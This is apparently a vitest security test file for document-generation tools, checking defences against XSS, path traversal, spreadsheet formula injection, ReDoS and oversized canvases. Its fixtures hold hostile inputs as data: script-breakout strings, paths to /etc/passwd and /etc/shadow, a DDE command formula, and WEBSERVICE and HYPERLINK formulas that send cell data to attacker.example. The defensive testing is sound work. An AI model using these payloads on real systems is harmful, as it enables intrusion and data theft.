import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import ExcelJS from 'exceljs'
import * as fs from 'fs'
import * as os from 'os'
import * as path from 'path'
import {
  INTERNAL_TOOLS,
  escapeHtmlAttr,
  imageDisplaySize,
  safeCell,
  safeJsonForScript,
  validateOutputPath,
} from '../internalTools'
import { StepMcpRouter } from '../stepRouter'
import type { InternalToolDefinition } from '../types'
import { zipEntryText } from './support/zipEntries'

// ─── Test Output Directory ──────────────────────────────────────────

let testOutputDir: string

beforeEach(() => {
  testOutputDir = fs.mkdtempSync(path.join(os.tmpdir(), 'clerum-sec-test-'))
})

afterEach(() => {
  fs.rmSync(testOutputDir, { recursive: true, force: true })
})

function findTool(name: string): InternalToolDefinition {
  const tool = INTERNAL_TOOLS.find(t => t.name === name)
  if (!tool) throw new Error(`Tool ${name} not found`)
  return tool
}

// ─── XSS via </script> in dashboard chart init ──────────────────────

describe('dashboard chart init <script> breakout', () => {
  it('escapes </script> in chart data so it cannot break out of <script> block', async () => {
    const tool = findTool('clerum__generate_dashboard')
    const malicious = "</script><script>alert('xss')</script>"
    const result = await tool.execute(
      {
        filename: 'script-breakout.html',
        template: 'custom',
        data: {
          title: 'Script breakout',
          blocks: [
            {
              type: 'chart',
              spec: {
                type: 'bar',
                labels: [malicious],
                datasets: [{ label: malicious, data: [1] }],
              },
            },
          ],
        },
      },
      testOutputDir
    )
    expect(result.success).toBe(true)
    const html = fs.readFileSync(path.join(testOutputDir, 'script-breakout.html'), 'utf-8')
    // The literal closing tag must NOT appear inside the <script> block.
    expect(html).not.toMatch(/<\/script><script>alert/)
    // The unicode-escaped form is what we expect to find embedded in the
    // chart spec, proving the encoding ran.
    expect(html).toContain('\\u003c')
  })

  it('safeJsonForScript output never contains a literal </script>', () => {
    const payload = { evil: '</script><img src=x onerror=alert(1)>' }
    const out = safeJsonForScript(payload)
    expect(out).not.toContain('</script>')
    expect(out).not.toContain('<script>')
    expect(out).toContain('\\u003c\\u002fscript\\u003e'.replace('\\u002f', '/'))
  })
})

// ─── XSS via attribute breakout in data-spark ───────────────────────

describe('dashboard data-spark attribute breakout', () => {
  it('escapes single-quote breakout in KPI sparkline attribute', async () => {
    const tool = findTool('clerum__generate_dashboard')
    // Sparkline values are numbers; the attribute is rendered from
    // JSON.stringify(sparkline). Even though numeric arrays don't
    // realistically carry attacker payload, the encoder must defang
    // structural HTML chars unconditionally.
    const result = await tool.execute(
      {
        filename: 'attr-breakout.html',
        template: 'custom',
        data: {
          title: 'Attr breakout',
          blocks: [
            {
              type: 'kpis',
              items: [
                {
                  label: 'Revenue',
                  value: '$10k',
                  sparkline: [1, 2, 3, 4, 5],
                },
              ],
            },
          ],
        },
      },
      testOutputDir
    )
    expect(result.success).toBe(true)
    const html = fs.readFileSync(path.join(testOutputDir, 'attr-breakout.html'), 'utf-8')
    // Must use double-quoted attribute and an escaped apostrophe form is fine,
    // but unescaped single-quote breakout (data-spark='[1,2]'><script>) must not exist.
    expect(html).not.toMatch(/data-spark='\[/)
  })

  it('escapeHtmlAttr defangs single quotes, double quotes, angle brackets', () => {
    const out = escapeHtmlAttr(`'"><script>alert(1)</script>`)
    expect(out).not.toContain("'")
    expect(out).not.toContain('"')
    expect(out).not.toContain('<')
    expect(out).not.toContain('>')
    expect(out).toContain('&#39;')
    expect(out).toContain('&quot;')
    expect(out).toContain('&lt;')
    expect(out).toContain('&gt;')
  })
})

// ─── Path traversal in image embedding ──────────────────────────────

describe('path traversal in image embedding', () => {
  it('rejects ../ traversal in PDF logoPath', async () => {
    const tool = findTool('clerum__generate_pdf')
    const result = await tool.execute(
      {
        filename: 'logo-traversal.pdf',
        title: 'Path traversal',
        body: 'test',
        coverPage: true,
        branding: { logoPath: '../../etc/passwd' },
      },
      testOutputDir
    )
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/path traversal blocked/)
  })

  it('rejects absolute path outside outputDir in DOCX img.path', async () => {
    const tool = findTool('clerum__generate_docx')
    const result = await tool.execute(
      {
        filename: 'image-traversal.docx',
        title: 'Path traversal',
        body: 'test',
        images: [{ path: '/etc/shadow' }],
      },
      testOutputDir
    )
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/path traversal blocked/)
  })

  it('validateOutputPath accepts relative paths inside outputDir', () => {
    const root = '/tmp/clerum-output'
    expect(validateOutputPath('chart.png', root)).toBe('/tmp/clerum-output/chart.png')
    expect(validateOutputPath('sub/dir/chart.png', root)).toBe(
      '/tmp/clerum-output/sub/dir/chart.png'
    )
  })

  it('validateOutputPath rejects ../ traversal', () => {
    expect(() => validateOutputPath('../etc/passwd', '/tmp/clerum-output')).toThrow(
      /path traversal blocked/
    )
    expect(() => validateOutputPath('/etc/shadow', '/tmp/clerum-output')).toThrow(
      /path traversal blocked/
    )
  })
})

// ─── AJV validation in stepRouter dispatch ──────────────────────────

describe('stepRouter AJV validation before tool execute', () => {
  it('rejects internal tool args that violate the JSON schema', async () => {
    const router = new StepMcpRouter(() => {
      throw new Error('factory should not be called')
    })
    router.registerInternalTools(INTERNAL_TOOLS, testOutputDir)

    // generate_markdown requires { filename, content }; pass content of
    // wrong type (number instead of string) — validation must reject
    // BEFORE execute() runs.
    const { result, record } = await router.callTool('clerum__generate_markdown', {
      filename: 'x.md',
      content: 12345,
    })
    expect(result.isError).toBe(true)
    const content = result.content as { success: boolean; error?: string }
    expect(content.success).toBe(false)
    expect(content.error).toMatch(/Invalid arguments/i)
    expect(record.durationMs).toBe(0)

    // No file should have been created.
    expect(fs.existsSync(path.join(testOutputDir, 'x.md'))).toBe(false)
  })

  it('rejects missing required fields', async () => {
    const router = new StepMcpRouter(() => {
      throw new Error('factory should not be called')
    })
    router.registerInternalTools(INTERNAL_TOOLS, testOutputDir)

    const { result } = await router.callTool('clerum__generate_pdf', {
      // missing required `filename` and `body`
      title: 'no body',
    })
    expect(result.isError).toBe(true)
    const content = result.content as { error?: string }
    expect(content.error).toMatch(/Invalid arguments/i)
  })

  it('passes valid args through to execute()', async () => {
    const router = new StepMcpRouter(() => {
      throw new Error('factory should not be called')
    })
    router.registerInternalTools(INTERNAL_TOOLS, testOutputDir)

    const { result } = await router.callTool('clerum__generate_markdown', {
      filename: 'good.md',
      content: '# hello',
    })
    expect(result.isError).toBeFalsy()
    expect(fs.existsSync(path.join(testOutputDir, 'good.md'))).toBe(true)
  })
})

// ─── Formula injection in XLSX cells ────────────────────────────────

describe('XLSX formula injection', () => {
  it('safeCell prefixes formula-leading strings with apostrophe', () => {
    expect(safeCell('=cmd|"/c calc"!A1')).toBe(`'=cmd|"/c calc"!A1`)
    expect(safeCell('+1+1')).toBe(`'+1+1`)
    expect(safeCell('-2*5')).toBe(`'-2*5`)
    expect(safeCell('@SUM(A1:A10)')).toBe(`'@SUM(A1:A10)`)
    expect(safeCell('\tinjected')).toBe(`'\tinjected`)
    expect(safeCell('\rinjected')).toBe(`'\rinjected`)
  })

  it('safeCell leaves benign strings alone', () => {
    expect(safeCell('hello world')).toBe('hello world')
    expect(safeCell('123abc')).toBe('123abc')
    expect(safeCell('')).toBe('')
  })

  it('safeCell passes non-strings through untouched', () => {
    expect(safeCell(42)).toBe(42)
    expect(safeCell(null)).toBe(null)
    expect(safeCell(undefined)).toBe(undefined)
    expect(safeCell(true)).toBe(true)
  })

  it('XLSX output stores formula-leading values as inert text, not formulas', async () => {
    const tool = findTool('clerum__generate_xlsx')
    const inert = ['=1+1', '+EVIL()', '@SUM(A1:A10)', '=cmd|"/c calc"!A1', '-', '\tinjected']
    const result = await tool.execute(
      {
        filename: 'formula-injection.xlsx',
        sheets: [
          {
            name: 'Data',
            titleRow: { text: '=HYPERLINK("https://attacker.example","x")' },
            rows: [['=Header'], ...inert.map(v => [v]), ['-12.5'], ['benign value']],
          },
        ],
      },
      testOutputDir
    )
    expect(result.success).toBe(true)
    const file = path.join(testOutputDir, 'formula-injection.xlsx')
    const sheetXml = zipEntryText(file, 'xl/worksheets/sheet1.xml')
    expect(sheetXml).not.toContain('<f>')
    expect(sheetXml).not.toContain('<f ')

    const wb = new ExcelJS.Workbook()
    await wb.xlsx.readFile(file)
    const ws = wb.worksheets[0]
    // Text format (@) keeps a re-edited cell from becoming a formula, so no
    // apostrophe has to be written into what the reader sees.
    for (const address of ['A1', 'A2', 'A3', 'A4', 'A5', 'A6', 'A7', 'A8']) {
      const cell = ws.getCell(address)
      expect(cell.type, address).toBe(ExcelJS.ValueType.String)
      expect(String(cell.value), address).not.toMatch(/^'/)
      expect(cell.numFmt, address).toBe('@')
    }
    expect(ws.getCell('A1').value).toBe('=HYPERLINK("https://attacker.example","x")')
    expect(ws.getCell('A3').value).toBe('=1+1')
    expect(ws.getCell('A7').value).toBe('-')
    expect(ws.getCell('A9').value).toBe(-12.5)
    expect(ws.getCell('A10').numFmt).not.toBe('@')
  })

  it.each([
    ['a formula object', { formula: 'WEBSERVICE("https://attacker.example/?x="&A1)' }],
    ['a shared formula object', { sharedFormula: 'A1', result: 1 }],
    ['a hyperlink object', { text: 'Click', hyperlink: 'https://attacker.example' }],
    ['a rich text object', { richText: [{ text: 'hi' }] }],
    ['an array', ['=1+1']],
    ['a Date object', new Date()],
  ])('XLSX refuses %s as a cell and never writes it', async (_label, cell) => {
    const tool = findTool('clerum__generate_xlsx')
    const result = await tool.execute(
      {
        filename: 'object-cell.xlsx',
        sheets: [
          {
            name: 'Data',
            rows: [
              ['Header', 'Other'],
              ['ok', cell],
            ],
          },
        ],
      },
      testOutputDir
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('sheets[0].rows[1][1]')
    expect(result.error).not.toContain('attacker.example')
    expect(fs.existsSync(path.join(testOutputDir, 'object-cell.xlsx'))).toBe(false)
  })

  it('XLSX refuses an object cell inside a row sent as a record', async () => {
    const tool = findTool('clerum__generate_xlsx')
    const result = await tool.execute(
      {
        filename: 'record-cell.xlsx',
        sheets: [{ name: 'Data', rows: [{ Link: { text: 'x', hyperlink: 'https://e.example' } }] }],
      },
      testOutputDir
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('sheets[0].rows[0].Link')
  })

  it('XLSX refuses an object as the title text', async () => {
    const tool = findTool('clerum__generate_xlsx')
    const result = await tool.execute(
      {
        filename: 'title-object.xlsx',
        sheets: [{ name: 'Data', titleRow: { text: { formula: 'NOW()' } }, rows: [['H'], [1]] }],
      },
      testOutputDir
    )
    expect(result.success).toBe(false)
    expect(result.error).toContain('sheets[0].titleRow.text')
    expect(fs.existsSync(path.join(testOutputDir, 'title-object.xlsx'))).toBe(false)
  })

  it('XLSX object cells are rejected on the workflow path before execute', async () => {
    const router = new StepMcpRouter(() => {
      throw new Error('should not connect')
    })
    router.registerInternalTools(INTERNAL_TOOLS, testOutputDir)
    const { result } = await router.callTool('clerum__generate_xlsx', {
      filename: 'wf-object-cell.xlsx',
      sheets: [{ name: 'Data', rows: [['H'], [{ formula: 'NOW()' }]] }],
    })
    expect(result.isError).toBe(true)
    expect(fs.existsSync(path.join(testOutputDir, 'wf-object-cell.xlsx'))).toBe(false)
  })
})

// ─── XLSX conditional-formatting regex ReDoS bounds ─────────────────

describe('XLSX conditional-formatting regex bounds', () => {
  it('skips oversized regex patterns with a warning without failing generation', async () => {
    const tool = findTool('clerum__generate_xlsx')
    // 300-char pattern exceeds MAX_REGEX_PATTERN_LENGTH=256; the rule is
    // dropped and reported, and generation still succeeds.
    const oversized = 'a'.repeat(300)
    const result = await tool.execute(
      {
        filename: 'redos-oversize.xlsx',
        sheets: [
          {
            name: 'Data',
            rows: [['Status'], ['ok'], ['warn']],
            conditionalFormatting: [
              {
                column: 'Status',
                rules: [{ regex: oversized, fillColor: '#ff0000' }],
              },
            ],
          },
        ],
      },
      testOutputDir
    )
    expect(result.success).toBe(true)
    expect(result.content).toContain('conditionalFormatting[0].rules[0].regex')
    expect(fs.existsSync(path.join(testOutputDir, 'redos-oversize.xlsx'))).toBe(true)
  })

  it('completes quickly against a ReDoS-prone pattern with a long cell value', async () => {
    const tool = findTool('clerum__generate_xlsx')
    // Classic catastrophic-backtracking pattern. Input is truncated to
    // MAX_REGEX_INPUT_LENGTH=4096 before matching, but the pattern is
    // exponential in n — we mainly check the call returns at all under a
    // generous time budget rather than asserting microsecond timing.
    const evilPattern = '^(a+)+$'
    const longCell = 'a'.repeat(40) + '!'
    const start = Date.now()
    const result = await tool.execute(
      {
        filename: 'redos-pattern.xlsx',
        sheets: [
          {
            name: 'Data',
            rows: [['Status'], [longCell]],
            conditionalFormatting: [
              {
                column: 'Status',
                rules: [{ regex: evilPattern, fillColor: '#ff0000' }],
              },
            ],
          },
        ],
      },
      testOutputDir
    )
    const elapsed = Date.now() - start
    expect(result.success).toBe(true)
    // A loose budget, so a slow machine passes; a true ReDoS would hang for minutes.
    expect(elapsed).toBeLessThan(20_000)
  }, 60_000)
})

// ─── Canvas pre-allocation limit ────────────────────────────────────

describe('chart canvas size limit', () => {
  it('rejects huge canvas dimensions before allocation', async () => {
    const tool = findTool('clerum__generate_chart')
    // 4000×4000 RGBA is 64 MB, over the 50 MiB canvas limit even at ratio 1.
    const result = await tool.execute(
      {
        filename: 'huge.png',
        type: 'bar',
        width: 4000,
        height: 4000,
        data: { labels: ['a'], datasets: [{ label: 'a', data: [1] }] },
      },
      testOutputDir
    )
    expect(result.success).toBe(false)
    expect(result.error).toMatch(/too large/i)
  })

  it('draws a large chart at a lower density instead of refusing it', async () => {
    // At twice the density 2400×1600 would need 61 MB of canvas, so it is
    // drawn at a lower ratio.
    const result = await findTool('clerum__generate_chart').execute(
      {
        filename: 'large.png',
        type: 'bar',
        width: 2400,
        height: 1600,
        data: { labels: ['a'], datasets: [{ label: 'a', data: [1] }] },
      },
      testOutputDir
    )
    expect(result.success).toBe(true)
    expect(imageDisplaySize(path.join(testOutputDir, 'large.png'))).toEqual({
      width: 2400,
      height: 1600,
    })
  })
})
